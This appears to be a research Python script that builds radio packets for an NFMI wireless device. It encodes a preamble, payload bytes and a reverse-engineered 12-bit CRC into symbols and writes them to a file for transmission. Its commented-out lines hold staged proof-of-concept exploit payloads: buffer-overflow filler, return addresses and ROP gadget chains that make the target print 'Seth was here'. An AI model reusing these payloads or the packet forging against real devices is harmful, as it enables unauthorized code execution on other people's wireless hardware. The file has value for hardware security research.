debug = False

import sys
import guesser
import crc_math
import compute_experimental
import argparse

fixed_preamble_symbols = [4,4,4,0,4,0,4,0,2,4,6,0,0,0,0,0,6,4,2,0]
preamble_list = []
preamble_bytes = [0x80,0x87,0]
parser = argparse.ArgumentParser(description='Convert packet data into a symbols that can be transmitted')
parser.add_argument('data', nargs=16, help='4 counter bytes, 1 data length byte, 11 bytes data (hex)')
parser.add_argument('-a', dest='ascii', action='store_true')
parser.add_argument('-q', dest='quiet', action='store_true')
parser.add_argument('--preamble', nargs=3, dest='preamble_list', help='3 preamble hex bytes (default: 80 87 00)')

args = parser.parse_args()
#print(args.preamble_list)
if args.preamble_list:
	preamble_bytes = [int(x, 16) for x in args.preamble_list]

#print(args.data)
if not args.ascii:
	data_bytes = [int(x, 16) for x in args.data]
else:
	data_bytes = [int(x, 16) for x in args.data[0:5]] + [ord(c) for c in args.data[5:16]]
#print(preamble_bytes, data_bytes)

if not args.quiet:
	print ('Using preamble, data: [{}], [{}]'.format(', '.join(hex(x) for x in preamble_bytes), ', '.join(hex(x) for x in data_bytes) )  )
data_bytes = preamble_bytes + data_bytes


#preamble_bytes = [0x80,0x87,0]
#preamble_bytes = [0,0,0] #didn't work
#preamble_bytes = [0xa0,0x87,0] #worked
#preamble_bytes = [0x80,0x86,0] #fail
#preamble_bytes = [0x80,0x07,0] #fail
#preamble_bytes = [0x81,0x87,0] #worked
#preamble_bytes = [0xff,0x87,0] #fail
#preamble_bytes = [0x82,0x87,0] #worked
#preamble_bytes = [0x84,0x87,0] #works very infrequently, probably due to lucky noise
#preamble_bytes = [0x83,0x87,0] #worked 
#preamble_bytes = [0xc0,0x87,0] #fail
#preamble_bytes = [0x80,0x00,0] #fail
#preamble_bytes = [0xc0,0xff,0x55] #fail



#data_bytes = [0x80,0x87,0] + [0,0,0,0,11,] + 8*[0xff] + [0,0,0]
#data_bytes = [0x80,0x85,0] + [0,0,0,0,11,] + 8*[0xff] + [7,7,7]
#data_bytes = [0x80,0x87,0] +[150  , 1 ,169 ,  0  , 0 , 48 , 52,  48 , 51 , 69 , 48 , 52 , 53,   0  , 0 ,  0 ]
#data_bytes = [0x80,0x87,0] + [0,0,0,0,11,] + [0,0,0,0,0,0,0,0,0,0,0]
#data_bytes = preamble_bytes + [0,0,0,0,11] + 8*[0xff] + [0xdd,0xdd,0xdd]
#data_bytes = [0x80,0x87,0] + [0,0,0,0,11] + [0,0,0,0,0,0,0,0,0,0,0]
#data_bytes = [0x80,0x87,0] + [0,0,0,0,11] + [0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x99,0xaa,0xbb]
#data_bytes = [0x80,0x87,0] + [0,0,0,0,10] + [0x42,0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x45,0x11]   #boring test

#new standard signal
#data_bytes = [0x80,0x87,0] + [0,0,0,0,11] + [0x42,1,2,3,4,5,6,7,8,9,0x45]  #new standard signal

#working POC for "Speaker"
#data_bytes = [0x80,0x87,0] + [0,0,0,0,33] + [0x42,0,1,2,3,4,5,6,7,8,9]   #'B' and 32 filler for start of POC attack
#data_bytes = [0x80,0x87,0] + [0,0,0,0,5] + [0x9D,0x0B,0x00,0x00,0x45, 0,0,0,0,0,0]   #POC  PC+1 = prinf("Goon"), 'E'  oops, actually addr for "Speaker"


#Seth was here
#data_bytes = [0x80,0x87,0] + [0,0,0,0,25] + [0x42,0,1,2,3,4,5,6,7,8,9]   #'B' and 24 filler for start of POC attack

#data_bytes = [0x80,0x87,0] + [0,0,0,0,16] + [0xB0,0x2f,0x00,0x20, 0,0,0,0, 0xDB,0x2D,0]   #will it fill in 5 0s on end? yes!   part2 for stock hacked NFMI?    new addr for mov r0, r4 pop {r4,pc}
#data_bytes = [0x80,0x87,0] + [0,0,0,0,16] + [ 0xB0,0x2f,0x00,0x20, 0,0,0,0,  0x4F,0x2E,0]   #will it fill in 5 0s on end? yes!   part2 for print_recv       new addr for mov r0, r4 pop {r4,pc}
# debugging: pop R4 R5 R6 PC                  R5                   R6
# regulare mode?  POP R4 R5 PC       		  R4                   R5?
#data_bytes = [0x80,0x87,0] + [0,0,0,0,11] + [0x2d, 0x04, 0, 0, 0x53, 0x65, 0x74, 0x68, 0x20, 0x77, 0x61]  #part3
#data_bytes = [0x80,0x87,0] + [0,0,0,0,11] + [0x73, 0x20, 0x68, 0x65, 0x72, 0x65, 0, 0x45, 0, 0, 0]  # part 4




#Seth was here for preint_recv which is doing POP R4 R5 R6 now...
#data_bytes = [0x80,0x87,0] + [0,0,0,0,21] + [0x42, 20,20,20,20, 20,20,20,20, 20,20]   #'B' and 20 filler for start of POC attack

#												R4 					R5 		 R6
#data_bytes = [0x80,0x87,0] + [0,0,0,0,12] + [0xB0,0x2f,0x00,0x20, 0,0,0,0,  0,0,0 ] #0 implied   part 2

# address keeps moving...   right now 2E2F -> MOVS R0, R4    POP {R4, PC}
#						                      PC             R4 2     PC 2
#data_bytes = [0x80,0x87,0] + [0,0,0,0,12] +  [0x2F,0x2E,0,0, 0,0,0,0, 0x2D,0x04,0x00    ]# 0x00 implied  part3 for print_recv       new addr for mov r0, r4 pop {r4,pc}
				

#                                            Seth                      cr   nl   \o   'E'
#data_bytes = [0x80,0x87,0] + [0,0,0,0,8] + [0x53, 0x65, 0x74, 0x68,   0x0d,0x0a,0x00,0x45, 0,0,0]  #part3 Seth0d0a00E
#data_bytes = [0x80,0x87,0] + [0,0,0,0,11] + [0x0d, 0x0a, 0x09, ord('S'),ord('e'),ord('t'),ord('h'),  ord(' '),ord('w'),ord('a'),ord('s'),]  #part 4

#data_bytes = [0x80,0x87,0] + [0,0,0,0,11] + [ord(' '),ord('h'),ord('e'),ord('r'),  ord('e'),ord('!'),ord('!'),0x0d,      0x0a, 0x00, ord('E') ]  #part 5

#data_bytes = [0x80,0x87,0] + [0,0,0,0,10] + [0x42, 0xdf, 0xdf, 0xdf, 0xdf, 0xdf, 0xdf, 0xdf, 0xdf, 0x45,0]  
#data_bytes = [0x80,0x87,0] + [0,0,0,0,8] + [0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0,0,0]  #part 5

assert(len(data_bytes)==19)


#find the CRC
if debug:
	print("CRC the old way using found values:")
	import crc_bit_rev_eng
	crc_value = crc_bit_rev_eng.compute_crc(data_bytes, 0)
	print("Calculated CRC:", crc_value)
	print("Calculated CRC:", hex(crc_value))

crc_12bit = crc_math.compute_12bit_crc(data_bytes[3:])
crc_value = crc_math.crc_12bit_to_20bit(crc_12bit)
if debug:
	print("CRC via algorithm:")
	print("CRC_12bit = {:03x}".format(crc_12bit))
	print("CRC_20bit = {:05x}".format( crc_value))
	#print(crc_math.crc_12bit_to_3bytes(crc_12bit))


#print("old CRC group and index:", crc_bit_rev_eng.crcs_values.index(crc_value)//32, crc_bit_rev_eng.crcs_values.index(crc_value))
#data_bytes += [crc_value & 0xff, (crc_value>>8)&0xff, (crc_value>>16)&0xff]
data_bytes += crc_math.crc_12bit_to_3bytes(crc_12bit)

#encode to symbols
symbols = fixed_preamble_symbols + compute_experimental.compute(data_bytes, [0]*(3+16+3), debug=False, ignore=8-3, print_error=False)
if debug: 
	print("Computed symbols:", symbols)
	crc_symbols = "".join(str(x) for x in symbols[-12:-2])
	print("CRC symobls:", crc_symbols)
assert(len(symbols) == 108)

#double check symbols
solution = guesser.solver([0]*(3+16+3), symbols[20:], debug=False, ignore=5, print_error=False, print_result=False)
assert(solution == data_bytes)
if debug: 
	print("Decoded data: ", solution)
	print("Original data:", data_bytes)
assert solution == data_bytes



#write to a file to be converted into a wav for transmission
#packet = symbols + [4,0,7,7]   #these are the diffed values...
packet = symbols + [7,7]
REPEATS = 271
#sys.exit()
with open("signal.bin","wb") as f:
	for n in range(0,REPEATS):
		assert(len(packet) == 110)
		f.write(bytearray(packet))
	f.write(bytearray(20*[0]))

if not args.quiet:
	print("wrote signal.bin")



#this worked after adjusting samp rate to 1.1885    crc len 14

#packet = bytearray([4,4,4,0,4,0,4,0,2,4,6,0,0,0,0,0,6,4,2,0,0,0,4,4,2,7,7,4,6,7,5,6,6,1,4,1,5,0,5,2,3,0,0,0,2,1,5,5,0,3,3,2,5,4,5,0,5,0,0,6,2,6,2,3,2,3,5,4,2,4,6,1,7,3,1,1,5,5,1,6,1,7,6,1,1,4,1,1,6,7,7,3,5,2,7,7, 5,0,0,3,6,0,4,4,0,0, 0,0,0,0])
# so last 4 don't matter, just noise/spacer?   crc len 10

#packet = bytearray([4,4,4,0,4,0,4,0,2,4,6,0,0,0,0,0,6,4,2,0,0,0,4,4,2,7,7,4,6,7,5,6,6,1,4,1,5,0,5,2,3,0,0,0,2,1,5,5,0,3,3,2,5,4,5,0,5,0,0,6,2,6,2,3,2,3,5,4,2,4,6,1,7,3,1,1,5,5,1,6,1,7,6,1,1,4,1,1,6,7,7,3,5,2,7,7, 5,0,0,3,6,0,  0,0,0,0,     0,0,0,0])
#FAIL. so those matter    crc len 6 didn't work

#packet = bytearray([4,4,4,0,4,0,4,0,2,4,6,0,0,0,0,0,6,4,2,0,0,0,4,4,2,7,7,4,6,7,5,6,6,1,4,1,5,0,5,2,3,0,0,0,2,1,5,5,0,3,3,2,5,4,5,0,5,0,0,6,2,6,2,3,2,3,5,4,2,4,6,1,7,3,1,1,5,5,1,6,1,7,6,1,1,4,1,1,6,7,7,3,5,2,7,7, 5,0,0,3,6,0,4,4,0,4, 0,0,0,0])
# worked some, luck?   crc len 10 with one bad symbol

#packet = bytearray([4,4,4,0,4,0,4,0,2,4,6,0,0,0,0,0,6,4,2,0,0,0,4,4,2,7,7,4,6,7,5,6,6,1,4,1,5,0,5,2,3,0,0,0,2,1,5,5,0,3,3,2,5,4,5,0,5,0,0,6,2,6,2,3,2,3,5,4,2,4,6,1,7,3,1,1,5,5,1,6,1,7,6,1,1,4,1,1,6,7,7,3,5,2,7,7, 5,0,0,3,6,0,4,4,4,4, 0,0,0,0])
# FAIL   crc len 10 with 2 bad symbols

#packet = bytearray([4,4,4,0,4,0,4,0,2,4,6,0,0,0,0,0,6,4,2,0,0,0,4,4,2,7,7,4,6,7,5,6,6,1,4,1,5,0,5,2,3,0,0,0,2,1,5,5,0,3,3,2,5,4,5,0,5,0,0,6,2,6,2,3,2,3,5,4,2,4,6,1,7,3,1,1,5,5,1,6,1,7,6,1,1,4,1,1,6,7,7,3,5,2,7,7, 5,0,0,3,6,0,4,4,0,2, 0,0,0,0])
# worked some, luck?   crc len 10 with one bad symbol